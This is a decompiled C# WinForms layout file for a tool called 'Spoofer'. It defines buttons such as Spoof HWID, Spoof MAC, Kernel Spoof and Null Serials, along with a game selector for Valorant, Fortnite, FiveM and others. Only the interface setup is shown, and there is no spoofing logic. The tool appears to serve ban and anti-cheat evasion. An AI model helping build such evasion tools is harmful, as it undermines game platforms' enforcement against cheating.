      ((Control) this.premnew1).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.premnew1).HoveredState.Parent = (CustomButtonBase) this.premnew1;
      ((Control) this.premnew1).Location = new Point(220, 95);
      ((Control) this.premnew1).Name = "premnew1";
      ((SiticoneButton) this.premnew1).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.premnew1).ShadowDecoration.Parent = (Control) this.premnew1;
      ((Control) this.premnew1).Size = new Size(90, 29);
      ((Control) this.premnew1).TabIndex = 74;
      ((Control) this.premnew1).Text = "Spoof Nvidia";
      ((Control) this.premnew1).Click += new EventHandler(this.premnew1_Click);
      this.panel1.BackColor = System.Drawing.Color.White;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.panel1, (DecorationType) 0);
      this.panel1.Location = new Point(208, 102);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(1, 156);
      this.panel1.TabIndex = 77;
      ((SiticoneButton) this.prem1).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem1).BorderThickness = 1;
      ((SiticoneButton) this.prem1).CheckedState.Parent = (CustomButtonBase) this.prem1;
      ((SiticoneButton) this.prem1).CustomImages.Parent = (CustomButtonBase) this.prem1;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.prem1, (DecorationType) 0);
      ((SiticoneButton) this.prem1).FillColor = System.Drawing.Color.Black;
      ((Control) this.prem1).Font = new Font("Segoe UI", 9f);
      ((Control) this.prem1).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem1).HoveredState.Parent = (CustomButtonBase) this.prem1;
      ((Control) this.prem1).Location = new Point(316, 95);
      ((Control) this.prem1).Name = "prem1";
      ((SiticoneButton) this.prem1).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.prem1).ShadowDecoration.Parent = (Control) this.prem1;
      ((Control) this.prem1).Size = new Size(90, 29);
      ((Control) this.prem1).TabIndex = 67;
      ((Control) this.prem1).Text = "Kernel Spoof";
      ((Control) this.prem1).Click += new EventHandler(this.siticoneRoundedButton12_Click_1);
      ((Control) this.siticoneLabel12).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel12, (DecorationType) 0);
      this.siticoneLabel12.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel12.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel12).Location = new Point(51, 75);
      ((Control) this.siticoneLabel12).Margin = new Padding(2);
      ((Control) this.siticoneLabel12).Name = "siticoneLabel12";
      ((Control) this.siticoneLabel12).Size = new Size(110, 15);
      ((Control) this.siticoneLabel12).TabIndex = 73;
      ((Control) this.siticoneLabel12).Text = "System Components";
      ((SiticoneButton) this.siticoneRoundedButton10).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton10).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton10).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton10;
      ((SiticoneButton) this.siticoneRoundedButton10).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton10;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton10, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton10).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton10).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton10).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton10).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton10;
      ((Control) this.siticoneRoundedButton10).Location = new Point(16, 234);
      ((Control) this.siticoneRoundedButton10).Name = "siticoneRoundedButton10";
      ((SiticoneButton) this.siticoneRoundedButton10).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton10).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton10;
      ((Control) this.siticoneRoundedButton10).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton10).TabIndex = 71;
      ((Control) this.siticoneRoundedButton10).Text = "Spoof Logs";
      ((Control) this.siticoneRoundedButton10).Click += new EventHandler(this.siticoneRoundedButton10_Click);
      ((SiticoneButton) this.siticoneRoundedButton8).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton8).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton8).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton8;
      ((SiticoneButton) this.siticoneRoundedButton8).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton8;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton8, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton8).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton8).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton8).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton8).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton8;
      ((Control) this.siticoneRoundedButton8).Location = new Point(16, 130);
      ((Control) this.siticoneRoundedButton8).Name = "siticoneRoundedButton8";
      ((SiticoneButton) this.siticoneRoundedButton8).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton8).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton8;
      ((Control) this.siticoneRoundedButton8).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton8).TabIndex = 70;
      ((Control) this.siticoneRoundedButton8).Text = "Spoof Xbox";
      ((Control) this.siticoneRoundedButton8).Click += new EventHandler(this.siticoneRoundedButton8_Click);
      ((SiticoneButton) this.siticoneRoundedButton6).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton6).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton6).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton6;
      ((SiticoneButton) this.siticoneRoundedButton6).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton6;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton6, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton6).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton6).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton6).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton6).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton6;
      ((Control) this.siticoneRoundedButton6).Location = new Point(112, 165);
      ((Control) this.siticoneRoundedButton6).Name = "siticoneRoundedButton6";
      ((SiticoneButton) this.siticoneRoundedButton6).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton6).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton6;
      ((Control) this.siticoneRoundedButton6).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton6).TabIndex = 68;
      ((Control) this.siticoneRoundedButton6).Text = "Spoof PCName";
      ((Control) this.siticoneRoundedButton6).Click += new EventHandler(this.siticoneRoundedButton6_Click);
      ((SiticoneButton) this.prem4).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem4).BorderThickness = 1;
      ((SiticoneButton) this.prem4).CheckedState.Parent = (CustomButtonBase) this.prem4;
      ((SiticoneButton) this.prem4).CustomImages.Parent = (CustomButtonBase) this.prem4;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.prem4, (DecorationType) 0);
      ((SiticoneButton) this.prem4).FillColor = System.Drawing.Color.Black;
      ((Control) this.prem4).Font = new Font("Segoe UI", 9f);
      ((Control) this.prem4).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem4).HoveredState.Parent = (CustomButtonBase) this.prem4;
      ((Control) this.prem4).Location = new Point(112, 234);
      ((Control) this.prem4).Name = "prem4";
      ((SiticoneButton) this.prem4).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.prem4).ShadowDecoration.Parent = (Control) this.prem4;
      ((Control) this.prem4).Size = new Size(90, 29);
      ((Control) this.prem4).TabIndex = 71;
      ((Control) this.prem4).Text = "Null Serials";
      ((Control) this.prem4).Click += new EventHandler(this.siticoneRoundedButton15_Click);
      ((SiticoneButton) this.siticoneRoundedButton5).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton5).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton5).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton5;
      ((SiticoneButton) this.siticoneRoundedButton5).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton5;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton5, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton5).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton5).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton5).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton5).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton5;
      ((Control) this.siticoneRoundedButton5).Location = new Point(112, 130);
      ((Control) this.siticoneRoundedButton5).Name = "siticoneRoundedButton5";
      ((SiticoneButton) this.siticoneRoundedButton5).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton5).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton5;
      ((Control) this.siticoneRoundedButton5).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton5).TabIndex = 67;
      ((Control) this.siticoneRoundedButton5).Text = "Spoof ID";
      ((Control) this.siticoneRoundedButton5).Click += new EventHandler(this.siticoneRoundedButton5_Click);
      ((SiticoneButton) this.prem3).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem3).BorderThickness = 1;
      ((SiticoneButton) this.prem3).CheckedState.Parent = (CustomButtonBase) this.prem3;
      ((SiticoneButton) this.prem3).CustomImages.Parent = (CustomButtonBase) this.prem3;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.prem3, (DecorationType) 0);
      ((SiticoneButton) this.prem3).FillColor = System.Drawing.Color.Black;
      ((Control) this.prem3).Font = new Font("Segoe UI", 9f);
      ((Control) this.prem3).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem3).HoveredState.Parent = (CustomButtonBase) this.prem3;
      ((Control) this.prem3).Location = new Point(220, 131);
      ((Control) this.prem3).Name = "prem3";
      ((SiticoneButton) this.prem3).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.prem3).ShadowDecoration.Parent = (Control) this.prem3;
      ((Control) this.prem3).Size = new Size(90, 29);
      ((Control) this.prem3).TabIndex = 70;
      ((Control) this.prem3).Text = "Spoof Traces";
      ((Control) this.prem3).Click += new EventHandler(this.siticoneRoundedButton7_Click_2);
      ((SiticoneButton) this.siticoneRoundedButton4).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton4).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton4).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton4;
      ((SiticoneButton) this.siticoneRoundedButton4).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton4;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton4, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton4).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton4).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton4).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton4).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton4;
      ((Control) this.siticoneRoundedButton4).Location = new Point(16, 165);
      ((Control) this.siticoneRoundedButton4).Name = "siticoneRoundedButton4";
      ((SiticoneButton) this.siticoneRoundedButton4).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton4).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton4;
      ((Control) this.siticoneRoundedButton4).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton4).TabIndex = 66;
      ((Control) this.siticoneRoundedButton4).Text = "Spoof MAC";
      ((Control) this.siticoneRoundedButton4).Click += new EventHandler(this.siticoneRoundedButton4_Click);
      ((SiticoneButton) this.prem2).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem2).BorderThickness = 1;
      ((SiticoneButton) this.prem2).CheckedState.Parent = (CustomButtonBase) this.prem2;
      ((SiticoneButton) this.prem2).CustomImages.Parent = (CustomButtonBase) this.prem2;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.prem2, (DecorationType) 0);
      ((SiticoneButton) this.prem2).FillColor = System.Drawing.Color.Black;
      ((Control) this.prem2).Font = new Font("Segoe UI", 9f);
      ((Control) this.prem2).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.prem2).HoveredState.Parent = (CustomButtonBase) this.prem2;
      ((Control) this.prem2).Location = new Point(112, 200);
      ((Control) this.prem2).Name = "prem2";
      ((SiticoneButton) this.prem2).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.prem2).ShadowDecoration.Parent = (Control) this.prem2;
      ((Control) this.prem2).Size = new Size(90, 29);
      ((Control) this.prem2).TabIndex = 69;
      ((Control) this.prem2).Text = "Spoof nvme";
      ((Control) this.prem2).Click += new EventHandler(this.siticoneRoundedButton14_Click);
      ((SiticoneButton) this.siticoneRoundedButton3).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton3).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton3).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton3;
      ((SiticoneButton) this.siticoneRoundedButton3).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton3;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton3, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton3).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton3).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton3).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton3).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton3;
      ((Control) this.siticoneRoundedButton3).Location = new Point(16, 200);
      ((Control) this.siticoneRoundedButton3).Name = "siticoneRoundedButton3";
      ((SiticoneButton) this.siticoneRoundedButton3).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton3).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton3;
      ((Control) this.siticoneRoundedButton3).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton3).TabIndex = 65;
      ((Control) this.siticoneRoundedButton3).Text = "Spoof Disk";
      ((Control) this.siticoneRoundedButton3).Click += new EventHandler(this.siticoneRoundedButton3_Click);
      ((SiticoneButton) this.siticoneRoundedButton2).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton2).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton2).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton2;
      ((SiticoneButton) this.siticoneRoundedButton2).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton2;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton2, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton2).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton2).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton2).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton2).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton2;
      ((Control) this.siticoneRoundedButton2).Location = new Point(112, 95);
      ((Control) this.siticoneRoundedButton2).Name = "siticoneRoundedButton2";
      ((SiticoneButton) this.siticoneRoundedButton2).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton2).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton2;
      ((Control) this.siticoneRoundedButton2).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton2).TabIndex = 64;
      ((Control) this.siticoneRoundedButton2).Text = "Spoof Info";
      ((Control) this.siticoneRoundedButton2).Click += new EventHandler(this.siticoneRoundedButton2_Click);
      ((SiticoneButton) this.siticoneRoundedButton1).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton1).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton1).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton1;
      ((SiticoneButton) this.siticoneRoundedButton1).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton1;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton1, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton1).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton1).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton1).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton1).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton1;
      ((Control) this.siticoneRoundedButton1).Location = new Point(16, 95);
      ((Control) this.siticoneRoundedButton1).Name = "siticoneRoundedButton1";
      ((SiticoneButton) this.siticoneRoundedButton1).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton1).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton1;
      ((Control) this.siticoneRoundedButton1).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton1).TabIndex = 63;
      ((Control) this.siticoneRoundedButton1).Text = "Spoof HWID";
      ((Control) this.siticoneRoundedButton1).Click += new EventHandler(this.siticoneRoundedButton1_Click);
      ((Control) this.siticoneLabel4).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel4, (DecorationType) 0);
      this.siticoneLabel4.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel4.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.siticoneLabel4).Location = new Point(68, 34);
      ((Control) this.siticoneLabel4).Margin = new Padding(2);
      ((Control) this.siticoneLabel4).Name = "siticoneLabel4";
      ((Control) this.siticoneLabel4).Size = new Size(95, 15);
      ((Control) this.siticoneLabel4).TabIndex = 62;
      ((Control) this.siticoneLabel4).Text = "Hardware Cleaner";
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.pictureBox4, (DecorationType) 0);
      this.pictureBox4.Image = (Image) Resources.pngaaa_com_3790696;
      this.pictureBox4.Location = new Point(11, 10);
      this.pictureBox4.Name = "pictureBox4";
      this.pictureBox4.Size = new Size(46, 35);
      this.pictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox4.TabIndex = 25;
      this.pictureBox4.TabStop = false;
      this.label5.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label5, (DecorationType) 0);
      this.label5.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
      this.label5.ForeColor = System.Drawing.Color.White;
      this.label5.Location = new Point(60, 6);
      this.label5.Name = "label5";
      this.label5.Size = new Size(107, 32);
      this.label5.TabIndex = 9;
      this.label5.Text = "Spoofer";
      ((Control) this.siticoneLabel2).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel2, (DecorationType) 0);
      this.siticoneLabel2.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel2.ForeColor = System.Drawing.Color.Red;
      ((Control) this.siticoneLabel2).Location = new Point(63, 34);
      ((Control) this.siticoneLabel2).Margin = new Padding(2);
      ((Control) this.siticoneLabel2).Name = "siticoneLabel2";
      ((Control) this.siticoneLabel2).Size = new Size(116, 15);
      ((Control) this.siticoneLabel2).TabIndex = 61;
      ((Control) this.siticoneLabel2).Text = "Coded by Dimis#1821";
      this.DiscordRPCTS.Checked = true;
      this.DiscordRPCTS.CheckedFillColor = System.Drawing.Color.Red;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.DiscordRPCTS, (DecorationType) 0);
      ((Control) this.DiscordRPCTS).Location = new Point(92, 78);
      ((Control) this.DiscordRPCTS).Name = "DiscordRPCTS";
      ((Control) this.DiscordRPCTS).Size = new Size(41, 22);
      ((Control) this.DiscordRPCTS).TabIndex = 67;
      ((Control) this.DiscordRPCTS).Text = "rpc";
      this.DiscordRPCTS.UncheckedFillColor = System.Drawing.Color.DimGray;
      ((ToggleSwitch) this.DiscordRPCTS).CheckedChanged += new EventHandler(this.DiscordRPCTS_CheckedChanged);
      ((Control) this.DiscordRPCTS).BackColorChanged += new EventHandler(this.DiscordRPCTS_BackColorChanged);
      ((Control) this.siticoneLabel3).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel3, (DecorationType) 0);
      this.siticoneLabel3.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 161);
      this.siticoneLabel3.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.siticoneLabel3).Location = new Point(16, 80);
      ((Control) this.siticoneLabel3).Margin = new Padding(2);
      ((Control) this.siticoneLabel3).Name = "siticoneLabel3";
      ((Control) this.siticoneLabel3).Size = new Size(73, 17);
      ((Control) this.siticoneLabel3).TabIndex = 69;
      ((Control) this.siticoneLabel3).Text = "Discord RPC: ";
      ((Control) this.gamepanel).BackColor = System.Drawing.Color.Transparent;
      ((Control) this.gamepanel).Controls.Add((Control) this.MethodCB);
      ((Control) this.gamepanel).Controls.Add((Control) this.textip);
      ((Control) this.gamepanel).Controls.Add((Control) this.enterip);
      ((Control) this.gamepanel).Controls.Add((Control) this.siticoneLabel5);
      ((Control) this.gamepanel).Controls.Add((Control) this.siticoneRoundedButton9);
      ((Control) this.gamepanel).Controls.Add((Control) this.siticoneLabel1);
      ((Control) this.gamepanel).Controls.Add((Control) this.pictureBox2);
      ((Control) this.gamepanel).Controls.Add((Control) this.label3);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.gamepanel, (DecorationType) 0);
      this.gamepanel.FillColor = System.Drawing.Color.Black;
      ((Control) this.gamepanel).Location = new Point(11, 93);
      ((Control) this.gamepanel).Name = "gamepanel";
      this.gamepanel.ShadowColor = System.Drawing.Color.Black;
      ((Control) this.gamepanel).Size = new Size(455, 311);
      ((Control) this.gamepanel).TabIndex = 71;
      ((Control) this.gamepanel).Paint += new PaintEventHandler(this.gamepanel_Paint);
      ((Control) this.MethodCB).BackColor = System.Drawing.Color.FromArgb(31, 31, 31);
      this.MethodCB.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.MethodCB, (DecorationType) 0);
      this.MethodCB.DrawMode = DrawMode.OwnerDrawFixed;
      this.MethodCB.DropDownStyle = ComboBoxStyle.DropDownList;
      this.MethodCB.FillColor = System.Drawing.Color.Black;
      this.MethodCB.FocusedColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.MethodCB.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      ((Control) this.MethodCB).Font = new Font("Segoe UI", 10f);
      ((Control) this.MethodCB).ForeColor = System.Drawing.Color.BlanchedAlmond;
      ((ComboBox) this.MethodCB).ItemHeight = 30;
      ((ComboBox) this.MethodCB).Items.AddRange(new object[5]
      {
        (object) "FiveM",
        (object) "Valorant",
        (object) "Fortnite",
        (object) "Call Of Duty",
        (object) "Rust"
      });
      ((Control) this.MethodCB).Location = new Point(151, 126);
      ((Control) this.MethodCB).Name = "MethodCB";
      ((Control) this.MethodCB).Size = new Size(166, 36);
      ((Control) this.MethodCB).TabIndex = 111;
      ((ComboBox) this.MethodCB).SelectedIndexChanged += new EventHandler(this.MethodCB_SelectedIndexChanged_2);
      ((Control) this.textip).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.textip, (DecorationType) 0);
      this.textip.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.textip.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.textip).Location = new Point(151, 173);
      ((Control) this.textip).Margin = new Padding(2);
      ((Control) this.textip).Name = "textip";
      ((Control) this.textip).Size = new Size(51, 15);
      ((Control) this.textip).TabIndex = 74;
      ((Control) this.textip).Text = "Server IP:";
      this.enterip.BorderColor = System.Drawing.Color.WhiteSmoke;
      this.enterip.BorderRadius = 3;
      ((Control) this.enterip).Cursor = Cursors.IBeam;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.enterip, (DecorationType) 0);
      ((TextBox) this.enterip).DefaultText = "127.0.0.1:30120";
      this.enterip.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
      this.enterip.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
      this.enterip.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
      this.enterip.DisabledState.Parent = (TextBox) this.enterip;
      this.enterip.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
      this.enterip.FillColor = System.Drawing.Color.Black;
      this.enterip.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.enterip.FocusedState.Parent = (TextBox) this.enterip;
      ((TextBox) this.enterip).ForeColor = System.Drawing.Color.DimGray;
      this.enterip.HoveredState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.enterip.HoveredState.Parent = (TextBox) this.enterip;
      ((Control) this.enterip).Location = new Point(207, 170);
      ((Control) this.enterip).Margin = new Padding(4);
      ((Control) this.enterip).Name = "enterip";
      ((TextBox) this.enterip).PasswordChar = char.MinValue;
      this.enterip.PlaceholderText = "";
      ((TextBox) this.enterip).SelectedText = "";
      this.enterip.ShadowDecoration.Parent = (Control) this.enterip;
      ((Control) this.enterip).Size = new Size(109, 22);
      ((Control) this.enterip).TabIndex = 73;
      ((TextBox) this.enterip).TextAlign = HorizontalAlignment.Center;
      ((Control) this.siticoneLabel5).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel5, (DecorationType) 0);
      this.siticoneLabel5.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel5.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel5).Location = new Point(149, 110);
      ((Control) this.siticoneLabel5).Margin = new Padding(2);
      ((Control) this.siticoneLabel5).Name = "siticoneLabel5";
      ((Control) this.siticoneLabel5).Size = new Size(66, 15);
      ((Control) this.siticoneLabel5).TabIndex = 69;
      ((Control) this.siticoneLabel5).Text = "Select Game";
      ((SiticoneButton) this.siticoneRoundedButton9).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton9).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton9).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton9;
      ((SiticoneButton) this.siticoneRoundedButton9).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton9;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton9, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton9).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton9).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton9).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton9).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton9;
      ((Control) this.siticoneRoundedButton9).Location = new Point((int) sbyte.MaxValue, 201);
      ((Control) this.siticoneRoundedButton9).Name = "siticoneRoundedButton9";
      ((SiticoneButton) this.siticoneRoundedButton9).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton9).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton9;
      ((Control) this.siticoneRoundedButton9).Size = new Size(209, 29);
      ((Control) this.siticoneRoundedButton9).TabIndex = 64;
      ((Control) this.siticoneRoundedButton9).Text = "Execute";
      ((Control) this.siticoneRoundedButton9).Click += new EventHandler(this.siticoneRoundedButton9_Click);
      ((Control) this.siticoneLabel1).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel1, (DecorationType) 0);
      this.siticoneLabel1.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel1.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.siticoneLabel1).Location = new Point(65, 34);
      ((Control) this.siticoneLabel1).Margin = new Padding(2);
      ((Control) this.siticoneLabel1).Name = "siticoneLabel1";
      ((Control) this.siticoneLabel1).Size = new Size(76, 15);
      ((Control) this.siticoneLabel1).TabIndex = 62;
